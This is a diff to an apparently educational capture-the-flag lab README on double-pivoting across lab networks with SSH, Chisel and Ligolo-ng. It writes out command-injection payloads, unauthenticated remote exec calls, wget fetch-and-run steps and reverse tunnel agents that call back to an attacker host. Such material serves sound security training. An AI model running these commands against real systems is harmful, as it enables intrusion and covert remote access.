@@ -52,6 +52,13 @@ docker compose down
 3. Reach the **target** SecretVault on Net C and capture the flag
 4. Repeat using all three tunneling methods to understand the tradeoffs
 
+## Tips Before You Start
+
+- **Use tmux** — you'll need multiple terminals. The attacker has tmux installed. `tmux` to start, `Ctrl+B %` to split vertically, `Ctrl+B ←/→` to switch panes.
+- **Backgrounding processes** — any long-running process started via SSH or the `/api/exec` endpoint needs the full `nohup ... > /dev/null 2>&1 &` treatment, or your terminal will hang.
+- **The `/api/exec` endpoint** uses HTTP form encoding. This means `+` becomes a space and `&` becomes a parameter separator. Use `%2B` for `+` signs, and use `--data-urlencode` instead of `-d` when your command contains `&`.
+- **Clean up between methods** — kill all tunnel processes before starting a new method (instructions provided between each section).
+
 ---
 
 ## Phase 1: Reconnaissance & Initial Foothold
@@ -69,7 +76,7 @@ You'll find port 22 (SSH) and port 5000 (HTTP).
 ### Exploit pivot1 (two paths)
 
 **Path A — Command Injection:**
-Visit `http://10.10.1.20:5000` in curl. The NetDiag app has an OS command injection vulnerability in the `/ping` endpoint:
+Visit `http://10.10.1.20:5000` with curl. The NetDiag app has an OS command injection vulnerability in the `/ping` endpoint:
 
 ```bash
 # Confirm injection works
@@ -115,7 +122,7 @@ proxychains4 curl http://10.10.2.30:8080/api/health
 
 # The /api/exec debug endpoint has no authentication
 proxychains4 curl -X POST http://10.10.2.30:8080/api/exec -d 'cmd=id'
-proxychains4 curl -X POST http://10.10.2.30:8080/api/exec -d 'cmd=ip addr'
+proxychains4 curl -X POST http://10.10.2.30:8080/api/exec -d 'cmd=ip%20addr'
 ```
 
 ### Second Pivot — Reaching Net C (the hard way)
@@ -130,16 +137,23 @@ ssh -L 8080:10.10.2.30:8080 -N -f root@10.10.1.20
 curl -X POST http://localhost:8080/api/exec -d 'cmd=id'
 ```
 
-To reach the target on Net C, set up another forward:
+To reach the target on Net C, you have to execute commands _on pivot2_ and read the output:
 
 ```bash
-# Forward through pivot1, then use pivot2's API to confirm Net C is reachable
-curl -X POST http://localhost:8080/api/exec -d 'cmd=curl -s http://10.10.3.40'
+# Use pivot2 to fetch the target page
+curl -X POST http://localhost:8080/api/exec \
+  --data-urlencode 'cmd=curl -s http://10.10.3.40'
 ```
 
-You should see the SecretVault page with the flag. But notice — you can't interact with Net C directly from your attacker. You're executing commands _on pivot2_ and reading the output. For a real pentest, this gets unwieldy fast.
+You should see the SecretVault page with the flag. But notice — you can't interact with Net C directly from your attacker. You're running commands on pivot2 and reading stdout. For a real pentest, this gets unwieldy fast with SSH alone.
 
-To actually browse the target from your attacker, you'd need to set up something like `socat` on pivot2 to relay traffic — which involves uploading socat, running it through the API, and managing yet another port forward chain. This is exactly the pain that Chisel and Ligolo-ng solve.
+### Cleanup — before moving to Method 2
+
+```bash
+pkill -f "ssh -D"
+pkill -f "ssh -L"
+pkill -f "ssh -N"
+```
 
 ---
 
@@ -147,22 +161,22 @@ To actually browse the target from your attacker, you'd need to set up something
 
 ### First Pivot — Attacker → Net B
 
+Start the chisel server on the attacker and deliver the client to pivot1:
+
 ```bash
-# On attacker: start chisel server (reverse mode, port 8888)
+# Terminal 1: start chisel server (reverse mode, port 8888)
 chisel server --reverse --port 8888 &
 
-# Deliver chisel to pivot1
-# Terminal 1: serve the binary
+# Terminal 2: serve binaries to targets
 cd /opt/serve && python3 -m http.server 8000 &
+```
 
-# Terminal 2: download chisel onto pivot1 via command injection
-curl "http://10.10.1.20:5000/ping?host=;wget%20http://10.10.1.10:8000/chisel%20-O%20/tmp/chisel"
-curl "http://10.10.1.20:5000/ping?host=;chmod%20%2Bx%20/tmp/chisel"
+Download chisel to pivot1 via SSH:
 
-# Or if you have SSH access:
+```bash
 ssh root@10.10.1.20 "wget http://10.10.1.10:8000/chisel -O /tmp/chisel && chmod +x /tmp/chisel"
 
-# Run chisel client on pivot1 (reverse SOCKS proxy back to attacker)
+# Run chisel client on pivot1 (reverse SOCKS proxy back to attacker on port 1080)
 ssh root@10.10.1.20 "nohup /tmp/chisel client 10.10.1.10:8888 R:1080:socks > /dev/null 2>&1 &"
 ```
 
@@ -175,28 +189,53 @@ proxychains4 curl http://10.10.2.30:8080/api/health
 
 ### Second Pivot — Reaching Net C
 
-Discover pivot2 the same way as before. Now use the `/api/exec` endpoint to deploy a second chisel:
+Pivot2 can't reach the attacker's chisel server directly (it's on Net B, not Net A). Relay the chisel server port through pivot1 using SSH remote port forwarding:
 
 ```bash
-# Serve chisel binary from pivot1 to pivot2
-# First, set up a port forward so pivot2 can reach attacker's files through pivot1
-ssh root@10.10.1.20 "cd /tmp && python3 -m http.server 9001 &"
-
-# Download chisel onto pivot2 via the API
-proxychains4 curl -X POST http://10.10.2.30:8080/api/exec \
-  -d 'cmd=wget http://10.10.2.20:9001/chisel -O /tmp/chisel && chmod +x /tmp/chisel'
-
-# Run chisel client on pivot2, connecting back through pivot1
-proxychains4 curl -X POST http://10.10.2.30:8080/api/exec \
-  -d 'cmd=/tmp/chisel client 10.10.2.20:8888 R:1081:socks &'
+ssh -R 0.0.0.0:8888:127.0.0.1:8888 root@10.10.1.20 -N -f
 ```
 
-> **Note:** You'll need to either chain SOCKS proxies or adjust your approach depending on how chisel is configured. The key advantage over SSH is that chisel works over HTTP and doesn't require SSH on the target.
-
-Then reach the target:
+Now `10.10.2.20:8888` on pivot1 forwards to the chisel server on the attacker. Serve the chisel binary from pivot1 to pivot2:
 
 ```bash
-proxychains4 curl http://10.10.3.40
+ssh root@10.10.1.20 "nohup python3 -m http.server 9001 -d /tmp > /dev/null 2>&1 &"
+```
+
+Download chisel onto pivot2 via the API:
+
+```bash
+proxychains4 curl -X POST http://10.10.2.30:8080/api/exec \
+  -d 'cmd=wget http://10.10.2.20:9001/chisel -O /tmp/chisel'
+
+proxychains4 curl -X POST http://10.10.2.30:8080/api/exec \
+  -d 'cmd=chmod %2Bx /tmp/chisel'
+```
+
+Run the chisel client on pivot2 (SOCKS on a different port — 1081):
+
+```bash
+proxychains4 curl -X POST http://10.10.2.30:8080/api/exec \
+  --data-urlencode 'cmd=nohup /tmp/chisel client 10.10.2.20:8888 R:1081:socks > /dev/null 2>&1 &'
+```
+
+Now SOCKS port 1081 provides access to Net C. Use it with a custom proxychains config:
+
+```bash
+proxychains4 -f <(echo -e "strict_chain\nproxy_dns\n[ProxyList]\nsocks5 127.0.0.1 1081") curl http://10.10.3.40
+```
+
+🚩 You should see the SecretVault page and the flag.
+
+> **Note:** Even with Chisel, the double pivot still required an SSH remote port forward to relay the connection. You end up mixing tools. Ligolo-ng handles this entirely within its own framework.
+
+### Cleanup — before moving to Method 3
+
+```bash
+pkill -f "ssh -R"
+pkill -f "ssh -N"
+pkill -f "chisel"
+pkill -f "http.server"
+ssh root@10.10.1.20 "pkill -f chisel; pkill -f http.server" 2>/dev/null
 ```
 
 ---
@@ -207,22 +246,28 @@ This is the cleanest approach — no proxychains, no SOCKS, tools just work nati
 
 ### First Pivot — Attacker → Net B
 
+Set up the Ligolo-ng proxy on the attacker:
+
 ```bash
-# On attacker: create TUN interface and start ligolo-ng proxy
+# Create TUN interface
 ip tuntap add user root mode tun ligolo
 ip link set ligolo up
-ligolo-proxy -selfcert
 
-# Deliver the agent to pivot1
-# In another terminal:
+# Start ligolo-ng proxy (this gives you an interactive console)
+ligolo-proxy -selfcert
+```
+
+In a separate terminal, deliver the agent to pivot1:
+
+```bash
+# Serve binaries
 cd /opt/serve && python3 -m http.server 8000 &
 
-# Download agent via command injection (or SSH)
-curl "http://10.10.1.20:5000/ping?host=;wget%20http://10.10.1.10:8000/ligolo-agent%20-O%20/tmp/agent"
-curl "http://10.10.1.20:5000/ping?host=;chmod%20%2Bx%20/tmp/agent"
+# Download agent to pivot1
+ssh root@10.10.1.20 "wget http://10.10.1.10:8000/ligolo-agent -O /tmp/agent && chmod +x /tmp/agent"
 
-# Run the agent on pivot1 (via SSH for convenience)
-ssh root@10.10.1.20 "/tmp/agent -connect 10.10.1.10:11601 -ignore-cert &"
+# Run the agent on pivot1
+ssh root@10.10.1.20 "nohup /tmp/agent -connect 10.10.1.10:11601 -ignore-cert > /dev/null 2>&1 &"
 ```
 
 Back in the ligolo-ng console:
@@ -232,11 +277,11 @@ Back in the ligolo-ng console:
 ligolo-ng » session
 # Choose the pivot1 session
 
-# Add route for Net B
+# Start the tunnel
 ligolo-ng » tunnel_start --tun ligolo
 ```
 
-Then on the attacker (separate terminal):
+In another terminal, add the route for Net B:
 
 ```bash
 ip route add 10.10.2.0/24 dev ligolo
@@ -251,35 +296,37 @@ curl http://10.10.2.30:8080/api/health
 
 ### Second Pivot — Reaching Net C
 
-Set up a listener on pivot1's session to relay the agent connection:
+Set up listeners on the pivot1 session to relay both the agent binary and the agent connection:
 
 ```
-# In ligolo-ng console (pivot1 session)
+# In ligolo-ng console (make sure pivot1 session is selected)
+# Relay agent binary: pivot1:9001 → attacker's http.server on port 8000
+ligolo-ng » listener_add --addr 0.0.0.0:9001 --to 127.0.0.1:8000 --tcp
+
+# Relay agent connection: pivot1:11601 → attacker's ligolo-proxy on port 11601
 ligolo-ng » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
 ```
 
-Also set up a listener to serve the agent binary:
-
-```
-ligolo-ng » listener_add --addr 0.0.0.0:9001 --to 127.0.0.1:8000 --tcp
-```
-
-Now deliver the agent to pivot2 and run it:
+Download and run the agent on pivot2 (no proxychains needed — you're going through the TUN interface):
 
 ```bash
-# Download agent onto pivot2 (through pivot1's listener)
+# Download agent onto pivot2 via pivot1's listener
 curl -X POST http://10.10.2.30:8080/api/exec \
-  -d 'cmd=wget http://10.10.2.20:9001/ligolo-agent -O /tmp/agent && chmod +x /tmp/agent'
+  -d 'cmd=wget http://10.10.2.20:9001/ligolo-agent -O /tmp/agent'
+
+# Make it executable
+curl -X POST http://10.10.2.30:8080/api/exec \
+  -d 'cmd=chmod %2Bx /tmp/agent'
 
 # Run agent on pivot2 (connects through pivot1's listener back to proxy)
 curl -X POST http://10.10.2.30:8080/api/exec \
-  -d 'cmd=/tmp/agent -connect 10.10.2.20:11601 -ignore-cert &'
+  --data-urlencode 'cmd=nohup /tmp/agent -connect 10.10.2.20:11601 -ignore-cert > /dev/null 2>&1 &'
 ```
 
-Back in ligolo-ng console:
+Back in the ligolo-ng console:
 
 ```
-# Create second TUN interface
+# Create a second TUN interface for Net C
 ligolo-ng » interface_create --name ligolo2
 
 # Switch to the new pivot2 session
@@ -290,19 +337,21 @@ ligolo-ng » session
 ligolo-ng » tunnel_start --tun ligolo2
 ```
 
-Add the route:
+Add the route for Net C:
 
 ```bash
 ip route add 10.10.3.0/24 dev ligolo2
 ```
 
-Now reach the target directly:
+Reach the target directly:
 
 ```bash
 curl http://10.10.3.40
 ```
 
 🚩 You should see the SecretVault page and the flag.
+
+Notice what you didn't need: no proxychains, no SSH port forwards, no mixing tools. The `listener_add` command handled both file delivery and agent relay within the same framework. This is why Ligolo-ng shines on multi-hop engagements.
 
 ---
 
@@ -315,24 +364,37 @@ curl http://10.10.3.40
 | ICMP/ping works through tunnel | ❌ No | ❌ No | ✅ Yes |
 | UDP works through tunnel | ❌ No | ✅ Partial | ✅ Yes |
 | Nmap SYN scan works | ❌ No | ❌ No | ⚠️ Translates to connect() |
-| Double pivot complexity | 🔴 High | 🟡 Medium | 🟢 Low |
+| Double pivot complexity | 🔴 High | 🟡 Medium (still needs SSH relay) | 🟢 Low |
 | Built-in port forwarding | SSH -L/-R | Remotes config | `listener_add` |
 | Transport protocol | SSH | HTTP/WebSocket | TCP/TLS |
 | Speed | Good | Good | Excellent (100+ Mbps) |
+| Double pivot without mixing tools | ❌ No | ❌ No (needed SSH -R) | ✅ Yes |
 
 ## Troubleshooting
 
 **"Operation not permitted" when creating TUN interface:**
 Make sure the attacker container has `cap_add: NET_ADMIN` and `/dev/net/tun` in docker-compose.yml.
 
-**Ligolo-ng agent can't connect back:**
-Check that the proxy is listening (`ss -tlnp | grep 11601`) and that the agent is using the correct IP. For the double pivot, make sure you added a listener on the first session.
+**Terminal hangs when running agent/chisel via SSH or /api/exec:**
+Long-running processes need `nohup ... > /dev/null 2>&1 &` to fully detach. Without it, SSH or subprocess.run() blocks waiting for stdout/stderr to close.
+
+**"Permission denied" when running downloaded binaries on pivot2:**
+You need to `chmod +x` first — but the `+` gets URL-decoded as a space through `/api/exec`. Use `chmod %2Bx /tmp/<binary>` instead.
+
+**"Syntax error: end of file unexpected" from /api/exec:**
+Your command contains `&` characters that curl interprets as form data separators. Use `--data-urlencode` instead of `-d`.
+
+**Chisel/Ligolo-ng agent on pivot2 can't connect back:**
+Pivot2 is on Net B and can't reach the attacker directly on Net A. You need a relay on pivot1: SSH `-R` for Chisel, or `listener_add` for Ligolo-ng.
+
+**Port conflicts between methods:**
+Kill all tunnel processes before starting a new method. See the cleanup steps between each method section. Also clean up leftover processes on pivot1: `ssh root@10.10.1.20 "pkill -f chisel; pkill -f agent; pkill -f http.server"`
 
 **Proxychains is slow or hanging:**
 SOCKS proxies don't support ICMP, so `ping` won't work through proxychains. Use `nmap -sT -Pn` (TCP connect scan, skip ping).
 
-**Chisel/Ligolo-ng agent download fails on pivot2:**
-You need to relay the file through pivot1. Make sure you're serving files on the right port and that the relay (listener or port forward) is active.
+**wget/curl through /api/exec times out:**
+The timeout is 120 seconds. If downloading large binaries is too slow, background the download and poll for the file.
 
 **Container can't resolve hostnames:**
 Use IP addresses directly. DNS isn't configured between the lab networks.
